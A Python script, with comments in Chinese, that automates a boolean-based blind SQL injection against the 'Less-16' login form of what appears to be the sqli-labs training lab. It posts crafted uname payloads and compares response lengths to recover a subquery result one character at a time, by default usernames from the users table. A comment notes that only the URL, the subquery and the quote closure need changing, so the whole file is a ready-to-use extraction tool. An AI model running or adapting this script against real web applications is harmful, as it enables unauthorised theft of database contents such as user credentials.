import requests

def subq_len(init_url, data, data_standard, headers, subquery):
    data_standard['uname'] = data_standard['uname'] % subquery
    response_1 = requests.post(url=init_url, data=data_standard, headers=headers)
    for i in range(1, 101):
        data_1 = data.copy()
        data_1['uname'] = data_1['uname'] % (subquery, i)
        response = requests.post(url=init_url, data=data_1 , headers=headers)
        if len(response.content)!= len(response_1.content):
            print("查询字段长度为：", i)
            return i
    return 0

def subq_data(init_url, data_1, data_1_standard, headers, subquery, data_len):
    str1 = ''
    for i in range(1, data_len + 1):
        data_2 = data_1_standard.copy()
        data_2['uname'] = data_1_standard['uname'] % (subquery, i)
        response_1 = requests.post(url=init_url, data=data_1_standard, headers=headers)
        for n in range(33, 127):  # 搜索ascii的所有可显示字符
            data_3 = data_1.copy()
            data_3['uname'] = data_1['uname'] % (subquery, i, n)
            response = requests.post(url=init_url, data=data_3, headers=headers)
            if len(response.content) == len(response_1.content):
                str1 = str1 + chr(n)
                break
    print('字段值：', str1)
    return str1


if __name__ == '__main__':
    subquery = "select username from users limit 2,1"
    init_url = "http://192.168.9.44:8848/Less-16/"  # 修改初始'url'和'子查询','data中闭合方式'即可
    data = {
        'uname': "\") or if(length((%s))=%s,1,0)#",
        'passwd': '11',
        'submit': 'Submit'
    }
    data_standard = {
        'uname': "\") or if(length((%s))=,1,0)#",
        'passwd': '11',
        'submit': 'Submit'
    }
    data_1 = {
        'uname': "\") or if(ascii(substr((%s),%s,1))=%s,0,1)#",
        'passwd': '11',
        'submit': 'Submit'
    }
    data_1_standard = {
        'uname': "\") or if(ascii(substr((%s),%s,1))=,0,1)#",
        'passwd': '11',
        'submit': 'Submit'
    }
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0', 'Content-Type': 'application/x-www-form-urlencoded'}
    data_len = subq_len(init_url, data, data_standard, headers, subquery)
    subq_data(init_url, data_1, data_1_standard, headers, subquery, data_len)

